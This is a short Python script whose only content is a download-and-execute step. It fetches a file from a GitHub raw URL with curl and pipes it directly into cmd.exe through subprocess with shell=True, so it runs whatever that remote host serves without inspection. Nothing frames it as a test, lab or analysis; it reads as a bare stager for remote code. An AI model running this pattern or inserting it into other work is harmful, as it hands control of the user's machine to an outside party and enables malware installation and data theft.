import subprocess

url = "https://github.com/joythink77/test/raw/refs/heads/main/1.py"

subprocess.run(
    f'curl -s "{url}" | cmd.exe',
    shell=True
)
